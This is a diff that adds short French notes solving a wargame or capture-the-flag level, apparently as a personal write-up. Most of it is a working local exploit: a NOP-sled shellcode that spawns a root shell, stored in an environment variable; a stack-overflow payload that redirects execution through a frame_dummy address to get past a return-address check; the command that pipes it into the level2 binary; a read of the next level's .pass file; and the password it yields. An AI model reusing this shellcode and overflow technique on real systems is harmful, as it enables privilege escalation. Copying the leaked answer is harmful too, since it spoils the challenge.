@@ -1,1 +1,14 @@
-http://beta.hackndo.com/retour-a-la-libc/
+d'abord on place notre shellcode dans l env
+
+export NIARK=$(python -c 'print "\x90" * 200 + "\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"')
+
+Ensuite on cherche l adresse de cette variable au lancement du programe grace a l 'envtrouveur (ici 0xbffff819)
+Si on essaye d erase eip directement la fonction p intercepte tout les future eip (le haut de la stack) comencant par b on redirige donc d'abord vers une autre fonction qui plante pas(ici au millieu de frame dummy (0x080484d0)) puis on change son future eip
+
+echo $(python -c 'print "\x51" * 80 + "\xd0\x84\x04\x08" + "\x19\xf8\xff\xbf"') > /tmp/test3 ; cat /tmp/test3 | /home/user/level2/level2
+
+puis
+
+cat /home/user/level3/.pass
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
